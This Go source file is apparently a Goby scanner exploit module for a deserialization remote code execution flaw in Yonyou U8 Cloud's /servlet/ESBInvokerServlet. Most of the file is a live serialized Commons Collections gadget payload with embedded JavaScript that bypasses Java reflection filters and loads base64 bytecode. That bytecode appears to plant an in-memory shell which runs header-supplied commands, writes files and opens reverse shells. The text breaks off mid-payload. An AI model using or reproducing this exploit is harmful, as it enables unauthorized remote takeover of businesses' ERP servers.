package exploits

import (
	"encoding/base64"
	"errors"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
	"time"
	"unicode/utf16"
)

func init() {
	expJson := `{
    "Name": "yonyou-U8-Cloud /ESBInvokerServlet Code Execution Vulnerability",
    "Description": "<p>Cloud is a new generation of cloud ERP launched by Yonyou, which mainly focuses on growing and innovative enterprises and provides enterprise-level cloud ERP overall solutions. </p><p>Yonyou U8 Cloud has a deserialization vulnerability, the system directly executes the deserialization operation without filtering the serialization data passed in by the user, combined with the deserialization exploitation chain existing in the system itself, and finally causes remote code execution.</p>",
    "Product": "yonyou-U8-Cloud",
    "Homepage": "https://www.yonyou.com/",
    "DisclosureDate": "2024-08-07",
    "PostTime": "2024-08-07",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "title=\"U8C\" && body=\"用友\"",
    "GobyQuery": "title=\"U8C\" && body=\"用友\"",
    "Level": "3",
    "Impact": "<p>Yonyou U8 Cloud has a deserialization vulnerability, the system directly executes the deserialization operation without filtering the serialization data passed in by the user, combined with the deserialization exploitation chain existing in the system itself, and finally causes remote code execution.</p>",
    "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls. </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "reverse",
            "type": "select",
            "value": "ByPowershellBase64,ByBashBase64",
            "show": "attackType=reverse"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution",
        "Code Execution",
        "HW-2024"
    ],
    "VulType": [
        "Command Execution",
        "Code Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "用友U8 Cloud /ESBInvokerServlet 反序化代码执行漏洞",
            "Product": "用友-U8-Cloud",
            "Description": "<p> Cloud是用友推出的新一代云ERP，主要聚焦成长型、创新型企业，提供企业级云ERP整体解决方案。<br></p><p>用友U8 Cloud存在反序列化漏洞，系统未将用户传入的序列化数据进行过滤就直接执行反序列化操作，结合系统本身存在的反序列化利用链，最终造成远程代码执行。<br></p>",
            "Recommendation": "<p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。&nbsp;</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>用友U8 Cloud存在反序列化漏洞，系统未将用户传入的序列化数据进行过滤就直接执行反序列化操作，结合系统本身存在的反序列化利用链，最终造成远程代码执行。<br></p>",
            "VulType": [
                "命令执行",
                "代码执行"
            ],
            "Tags": [
                "命令执行",
                "代码执行",
                "HW-2024"
            ]
        },
        "EN": {
            "Name": "yonyou-U8-Cloud /ESBInvokerServlet Code Execution Vulnerability",
            "Product": "yonyou-U8-Cloud",
            "Description": "<p>Cloud is a new generation of cloud ERP launched by Yonyou, which mainly focuses on growing and innovative enterprises and provides enterprise-level cloud ERP overall solutions.&nbsp;</p><p>Yonyou U8 Cloud has a deserialization vulnerability, the system directly executes the deserialization operation without filtering the serialization data passed in by the user, combined with the deserialization exploitation chain existing in the system itself, and finally causes remote code execution.<br></p>",
            "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>Yonyou U8 Cloud has a deserialization vulnerability, the system directly executes the deserialization operation without filtering the serialization data passed in by the user, combined with the deserialization exploitation chain existing in the system itself, and finally causes remote code execution.<br></p>",
            "VulType": [
                "Command Execution",
                "Code Execution"
            ],
            "Tags": [
                "Command Execution",
                "Code Execution",
                "HW-2024"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9921"
}`
	setPayloadRequestHashfnuf34nhf3bgfygy4defwfewew := func(hostInfo *httpclient.FixUrl, command string) (string, string, error) {
		//command为原始命令，如果需编码，请自行编码后使用
		//漏洞url地址
		vulURL := "/servlet/ESBInvokerServlet"
		requestConfig := httpclient.NewPostRequestConfig(vulURL)
		requestConfig.VerifyTls = false
		requestConfig.Header.Store("Cmd", command)
		requestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
		requestConfig.FollowRedirect = false
		payload := "\xac\xed\x00\x05sr\x00\x11java.util.HashSet\xbaD\x85\x95\x96\xb8\xb74\x03\x00\x00xpw\x0c\x00\x00\x00\x02?@\x00\x00\x00\x00\x00\x01sr\x004org.apache.commons.collections.keyvalue.TiedMapEntry\x8a\xad\xd2\x9b9\xc1\x1f\xdb\x02\x00\x02L\x00\x03keyt\x00\x12Ljava/lang/Object;L\x00\x03mapt\x00\x0fLjava/util/Map;xpt\x00\x03foosr\x00*org.apache.commons.collections.map.LazyMapn\xe5\x94\x82\x9ey\x10\x94\x03\x00\x01L\x00\x07factoryt\x00,Lorg/apache/commons/collections/Transformer;xpsr\x00:org.apache.commons.collections.functors.ChainedTransformer0\xc7\x97\xec\x28z\x97\x04\x02\x00\x01[\x00\x0diTransformerst\x00-[Lorg/apache/commons/collections/Transformer;xpur\x00-[Lorg.apache.commons.collections.Transformer;\xbdV*\xf1\xd84\x18\x99\x02\x00\x00xp\x00\x00\x00\x04sr\x00;org.apache.commons.collections.functors.ConstantTransformerXv\x90\x11A\x02\xb1\x94\x02\x00\x01L\x00\x09iConstantq\x00~\x00\x03xpvr\x00 javax.script.ScriptEngineManager\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00xpsr\x00:org.apache.commons.collections.functors.InvokerTransformer\x87\xe8\xffk\x7b|\xce8\x02\x00\x03[\x00\x05iArgst\x00\x13[Ljava/lang/Object;L\x00\x0biMethodNamet\x00\x12Ljava/lang/String;[\x00\x0biParamTypest\x00\x12[Ljava/lang/Class;xpur\x00\x13[Ljava.lang.Object;\x90\xceX\x9f\x10s\x29l\x02\x00\x00xp\x00\x00\x00\x00t\x00\x0bnewInstanceur\x00\x12[Ljava.lang.Class;\xab\x16\xd7\xae\xcb\xcdZ\x99\x02\x00\x00xp\x00\x00\x00\x00sq\x00~\x00\x13uq\x00~\x00\x18\x00\x00\x00\x01t\x00\x02jst\x00\x0fgetEngineByNameuq\x00~\x00\x1b\x00\x00\x00\x01vr\x00\x10java.lang.String\xa0\xf0\xa48z;\xb3B\x02\x00\x00xpsq\x00~\x00\x13uq\x00~\x00\x18\x00\x00\x00\x01t45try \x7b\x0a  load\x28\"nashorn:mozilla_compat.js\"\x29;\x0a\x7d catch \x28e\x29 \x7b\x7d\x0afunction getUnsafe\x28\x29\x7b\x0a  var theUnsafeMethod = java.lang.Class.forName\x28\"sun.misc.Unsafe\"\x29.getDeclaredField\x28\"theUnsafe\"\x29;\x0a  theUnsafeMethod.setAccessible\x28true\x29; \x0a  return theUnsafeMethod.get\x28null\x29;\x0a\x7d\x0afunction removeClassCache\x28clazz\x29\x7b\x0a  var unsafe = getUnsafe\x28\x29;\x0a  var clazzAnonymousClass = unsafe.defineAnonymousClass\x28clazz,java.lang.Class.forName\x28\"java.lang.Class\"\x29.getResourceAsStream\x28\"Class.class\"\x29.readAllBytes\x28\x29,null\x29;\x0a  var reflectionDataField = clazzAnonymousClass.getDeclaredField\x28\"reflectionData\"\x29;\x0a  unsafe.putObject\x28clazz,unsafe.objectFieldOffset\x28reflectionDataField\x29,null\x29;\x0a\x7d\x0afunction bypassReflectionFilter\x28\x29 \x7b\x0a  var reflectionClass;\x0a  try \x7b\x0a    reflectionClass = java.lang.Class.forName\x28\"jdk.internal.reflect.Reflection\"\x29;\x0a  \x7d catch \x28error\x29 \x7b\x0a    reflectionClass = java.lang.Class.forName\x28\"sun.reflect.Reflection\"\x29;\x0a  \x7d\x0a  var unsafe = getUnsafe\x28\x29;\x0a  var classBuffer = reflectionClass.getResourceAsStream\x28\"Reflection.class\"\x29.readAllBytes\x28\x29;\x0a  var reflectionAnonymousClass = unsafe.defineAnonymousClass\x28reflectionClass, classBuffer, null\x29;\x0a  var fieldFilterMapField = reflectionAnonymousClass.getDeclaredField\x28\"fieldFilterMap\"\x29;\x0a  var methodFilterMapField = reflectionAnonymousClass.getDeclaredField\x28\"methodFilterMap\"\x29;\x0a  if \x28fieldFilterMapField.getType\x28\x29.isAssignableFrom\x28java.lang.Class.forName\x28\"java.util.HashMap\"\x29\x29\x29 \x7b\x0a    unsafe.putObject\x28reflectionClass, unsafe.staticFieldOffset\x28fieldFilterMapField\x29, java.lang.Class.forName\x28\"java.util.HashMap\"\x29.getConstructor\x28\x29.newInstance\x28\x29\x29;\x0a  \x7d\x0a  if \x28methodFilterMapField.getType\x28\x29.isAssignableFrom\x28java.lang.Class.forName\x28\"java.util.HashMap\"\x29\x29\x29 \x7b\x0a    unsafe.putObject\x28reflectionClass, unsafe.staticFieldOffset\x28methodFilterMapField\x29, java.lang.Class.forName\x28\"java.util.HashMap\"\x29.getConstructor\x28\x29.newInstance\x28\x29\x29;\x0a  \x7d\x0a  removeClassCache\x28java.lang.Class.forName\x28\"java.lang.Class\"\x29\x29;\x0a\x7d\x0afunction setAccessible\x28accessibleObject\x29\x7b\x0a    var unsafe = getUnsafe\x28\x29;\x0a    var overrideField = java.lang.Class.forName\x28\"java.lang.reflect.AccessibleObject\"\x29.getDeclaredField\x28\"override\"\x29;\x0a    var offset = unsafe.objectFieldOffset\x28overrideField\x29;\x0a    unsafe.putBoolean\x28accessibleObject, offset, true\x29;\x0a\x7d\x0afunction defineClass\x28bytes\x29\x7b\x0a  var clz = null;\x0a  var version = java.lang.System.getProperty\x28\"java.version\"\x29;\x0a  var unsafe = getUnsafe\x28\x29;\x0a  var classLoader = new java.net.URLClassLoader\x28java.lang.reflect.Array.newInstance\x28java.lang.Class.forName\x28\"java.net.URL\"\x29, 0\x29\x29;\x0a  try\x7b\x0a    if \x28version.split\x28\".\"\x29[0] >= 11\x29 \x7b\x0a      bypassReflectionFilter\x28\x29;\x0a    defineClassMethod = java.lang.Class.forName\x28\"java.lang.ClassLoader\"\x29.getDeclaredMethod\x28\"defineClass\", java.lang.Class.forName\x28\"[B\"\x29,java.lang.Integer.TYPE, java.lang.Integer.TYPE\x29;\x0a    setAccessible\x28defineClassMethod\x29;\x0a    // \xe7\xbb\x95\xe8\xbf\x87 setAccessible \x0a    clz = defineClassMethod.invoke\x28classLoader, bytes, 0, bytes.length\x29;\x0a    \x7delse\x7b\x0a      var protectionDomain = new java.security.ProtectionDomain\x28new java.security.CodeSource\x28null, java.lang.reflect.Array.newInstance\x28java.lang.Class.forName\x28\"java.security.cert.Certificate\"\x29, 0\x29\x29, null, classLoader, []\x29;\x0a      clz = unsafe.defineClass\x28null, bytes, 0, bytes.length, classLoader, protectionDomain\x29;\x0a    \x7d\x0a  \x7dcatch\x28error\x29\x7b\x0a    error.printStackTrace\x28\x29;\x0a  \x7dfinally\x7b\x0a    return clz;\x0a  \x7d\x0a\x7d\x0afunction base64DecodeToByte\x28str\x29 \x7b\x0a  var bt;\x0a  try\x7b\x0a    bt = java.lang.Class.forName\x28\"sun.misc.BASE64Decoder\"\x29.newInstance\x28\x29.decodeBuffer\x28str\x29;\x0a  \x7dcatch\x28e\x29\x7b\x7d\x0a  if \x28bt == null\x29\x7b\x0a    try\x7b\x0a      bt = java.lang.Class.forName\x28\"java.util.Base64\"\x29.newInstance\x28\x29.getDecoder\x28\x29.decode\x28str\x29;\x0a    \x7dcatch\x28e\x29\x7b\x7d\x0a  \x7d\x0a  if\x28bt == null\x29\x7b\x0a    try\x7b\x0a      bt = java.util.Base64.getDecoder\x28\x29.decode\x28str\x29;\x0a    \x7dcatch\x28e\x29\x7b\x7d\x0a  \x7d\x0a  if \x28bt == null\x29\x7b\x0a    bt = java.lang.Class.forName\x28\"org.apache.commons.codec.binary.Base64\"\x29.newInstance\x28\x29.decode\x28str\x29;\x0a  \x7d\x0a  return bt;\x0a\x7d\x0avar code=\"yv66vgAAADEBmgoAHgCtCgBDAK4KAEMArwoAHgCwCACxCgAcALIKALMAtAoAswC1BwC2CgBDALcIAKUKACEAuAgAuQgAugcAuwgAvAgAvQcAvgoAHAC/CADACADBBwDCCwAWAMMLAMQAxQsAxADGCADHCADIBwDJCgAcAMoHAMsKAMwAzQgAzgcAzwgA0AoAjwDRCgAhANIIANMJANQA1QoA1ADWCADXCgCPANgKABwA2QgA2gcA2woAHADcCADdBwDeCADfCADgCgAcAOEHAOIKAEMA4woA5ADYCADlCgAhAOYIAOcKACEA6AgA6QoAIQDqCgCPAOsIAOwKACEA7QgA7gkAjwDvCgDUAPAJAI8A8QcA8goAQwDzCgBDAPQIAKYIAPUIAPYKAI8A9wgA+AoAjwD5BwD6CgBMAPsHAPwKAE4A/QoAjwD+CgBOAP8KAE4BAAoATgEBCgAvAQIKAEwBAwoAIQEECAEFCgEGAQcKACEBCAgBCQgBCggBCwcBDAoAXQCtCgBdAQ0IAQ4KAF0BAggBDwgBEAgBEQgBEgoBEwEUCgETARUHARYKARcBGAoAaAEZCAEaCgBoARsKAGgAxQoAaAEcCgEXAR0KARcBHggBHwgBIAoBEwEhBwEiCgB0ASMKAHQBGAoBFwEkCgB0ASQKAHQBJQoBJgEnCgEmASgKASkBKgoBKQEABQAAAAAAAAAyCgBDASsKARcBLAoAdAEBCAEtCgAvAS4IAS8IATAKANQBMQoAjwEyCAEzCAE0CAE1CAE2CACpCAE3BwE4AQAMQkFTRTY0X0NIQVJTAQASTGphdmEvbGFuZy9TdHJpbmc7AQANQ29uc3RhbnRWYWx1ZQgBOQEAAmlwAQAEcG9ydAEAE0xqYXZhL2xhbmcvSW50ZWdlcjsBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAKRXhjZXB0aW9ucwEACWxvYWRDbGFzcwEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBAAlTaWduYXR1cmUBACgoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M8Kj47AQAFcHJveHkBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEABXdyaXRlAQA4KExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAApjbGVhclBhcmFtAQAEZXhlYwEAB3JldmVyc2UBACcoTGphdmEvbGFuZy9TdHJpbmc7SSlMamF2YS9sYW5nL1N0cmluZzsBAANydW4BAAZkZWNvZGUBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAKU291cmNlRmlsZQEAB0E0LmphdmEMAJcAmAwBOgE7DAE8AT0MAT4BPwEAB3RocmVhZHMMAUABQQcBQgwBQwFEDAFFAUYBABNbTGphdmEvbGFuZy9UaHJlYWQ7DAFHAUgMAUkBSgEABGh0dHABAAZ0YXJnZXQBABJqYXZhL2xhbmcvUnVubmFibGUBAAZ0aGlzJDABAAdoYW5kbGVyAQAeamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uDAFLAT8BAAZnbG9iYWwBAApwcm9jZXNzb3JzAQAOamF2YS91dGlsL0xpc3QMAUwBTQcBTgwBTwFQDAFRAVIBAANyZXEBAAtnZXRSZXNwb25zZQEAD2phdmEvbGFuZy9DbGFzcwwBUwFUAQAQamF2YS9sYW5nL09iamVjdAcBVQwBVgFXAQAJZ2V0SGVhZGVyAQAQamF2YS9sYW5nL1N0cmluZwEAA2NtZAwAoAChDAFYAVkBAAlzZXRTdGF0dXMHAVoMAVsBXAwBXQFeAQAkb3JnLmFwYWNoZS50b21jYXQudXRpbC5idWYuQnl0ZUNodW5rDACcAJ0MAV8BUgEACHNldEJ5dGVzAQACW0IMAWABVAEAB2RvV3JpdGUBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQATamF2YS5uaW8uQnl0ZUJ1ZmZlcgEABHdyYXAMAWEAnQEAIGphdmEvbGFuZy9DbGFzc05vdEZvdW5kRXhjZXB0aW9uDAFiAWMHAWQBAAAMAWUBZgEAEGNvbW1hbmQgbm90IG51bGwMAWcBSAEABSMjIyMjDAFoAWkMAKQAoQEAAToMAWoBawEAImNvbW1hbmQgcmV2ZXJzZSBob3N0IGZvcm1hdCBlcnJvciEMAJQAkQwBbAFtDACVAJYBABBqYXZhL2xhbmcvVGhyZWFkDACXAW4MAW8AmAEABSQkJCQkAQASZmlsZSBmb3JtYXQgZXJyb3IhDACiAKMBAAVAQEBAQAwApQChAQAMamF2YS9pby9GaWxlDACXAXABABhqYXZhL2lvL0ZpbGVPdXRwdXRTdHJlYW0MAJcBcQwAqQCqDACiAXIMAXMAmAwBdACYDAF1AUgMAXYBSAwBdwF4AQAHb3MubmFtZQcBeQwBegChDAF7AUgBAAN3aW4BAARwaW5nAQACLW4BABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwBfAF9AQAFIC1uIDQBAAIvYwEABSAtdCA0AQACc2gBAAItYwcBfgwBfwGADAClAYEBABFqYXZhL3V0aWwvU2Nhbm5lcgcBggwBgwGEDACXAYUBAAJcYQwBhgGHDAFRAUgMAYgBhAwBiQCYAQAHL2Jpbi9zaAEAB2NtZC5leGUMAKUBigEAD2phdmEvbmV0L1NvY2tldAwAlwGLDAGMAY0MAY4BUAcBjwwBkAGRDAGSAZEHAZMMAKIBlAwBlQGWDAGXAZEBAB1yZXZlcnNlIGV4ZWN1dGUgZXJyb3IsIG1zZyAtPgwBmAFIAQABIQEAE3JldmVyc2UgZXhlY3V0ZSBvayEMAZkBkQwApgCnAQAWc3VuLm1pc2MuQkFTRTY0RGVjb2RlcgEADGRlY29kZUJ1ZmZlcgEAEGphdmEudXRpbC5CYXNlNjQBAApnZXREZWNvZGVyAQAmb3JnLmFwYWNoZS5jb21tb25zLmNvZGVjLmJpbmFyeS5CYXNlNjQBAAJBNAEAQEFCQ0RFRkdISUpLTE1OT1BRUlNUVVZXWFlaYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXowMTIzNDU2Nzg5Ky8BAA1jdXJyZW50VGhyZWFkAQAUKClMamF2YS9sYW5nL1RocmVhZDsBAA5nZXRUaHJlYWRHcm91cAEAGSgpTGphdmEvbGFuZy9UaHJlYWRHcm91cDsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAHZ2V0TmFtZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBAA1nZXRTdXBlcmNsYXNzAQAIaXRlcmF0b3IBABYoKUxqYXZhL3V0aWwvSXRlcmF0b3I7AQASamF2YS91dGlsL0l0ZXJhdG9yAQAHaGFzTmV4dAEAAygpWgEABG5leHQBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAhnZXRCeXRlcwEABCgpW0IBABFqYXZhL2xhbmcvSW50ZWdlcgEABFRZUEUBABFMamF2YS9sYW5nL0NsYXNzOwEAB3ZhbHVlT2YBABYoSSlMamF2YS9sYW5nL0ludGVnZXI7AQALbmV3SW5zdGFuY2UBABFnZXREZWNsYXJlZE1ldGhvZAEAB2Zvck5hbWUBABVnZXRDb250ZXh0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyAQAGZXF1YWxzAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQAEdHJpbQEACnN0YXJ0c1dpdGgBABUoTGphdmEvbGFuZy9TdHJpbmc7KVoBAAVzcGxpdAEAJyhMamF2YS9sYW5nL1N0cmluZzspW0xqYXZhL2xhbmcvU3RyaW5nOwEACHBhcnNlSW50AQAVKExqYXZhL2xhbmcvU3RyaW5nOylJAQAXKExqYXZhL2xhbmcvUnVubmFibGU7KVYBAAVzdGFydAEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAEShMamF2YS9pby9GaWxlOylWAQAFKFtCKVYBAAVmbHVzaAEABWNsb3NlAQAIdG9TdHJpbmcBAA9nZXRBYnNvbHV0ZVBhdGgBAAdyZXBsYWNlAQBEKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlO0xqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylMamF2YS9sYW5nL1N0cmluZzsBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBAAt0b0xvd2VyQ2FzZQEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAA5nZXRFcnJvclN0cmVhbQEAB2Rlc3Ryb3kBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABYoTGphdmEvbGFuZy9TdHJpbmc7SSlWAQAPZ2V0T3V0cHV0U3RyZWFtAQAYKClMamF2YS9pby9PdXRwdXRTdHJlYW07AQAIaXNDbG9zZWQBABNqYXZhL2lvL0lucHV0U3RyZWFtAQAJYXZhaWxhYmxlAQADKClJAQAEcmVhZAEAFGphdmEvaW8vT3V0cHV0U3RyZWFtAQAEKEkpVgEABXNsZWVwAQAEKEopVgEACWV4aXRWYWx1ZQEACmdldE1lc3NhZ2UBAAhpbnRWYWx1ZQAhAI8AHgABAA8AAwAaAJAAkQABAJIAAAACAJMAAgCUAJEAAAACAJUAlgAAAAkAAQCXAJgAAgCZAAADtgAGABMAAAKOKrcAAbgAArYAA0wrtgAEEgW2AAZNLAS2AAcsK7YACMAACcAACU4tOgQZBL42BQM2BhUGFQWiAlgZBBUGMjoHGQfHAAanAkMZB7YACjoIGQgSC7YADJoADRkIEg22AAyaAAanAiUZB7YABBIOtgAGTSwEtgAHLBkH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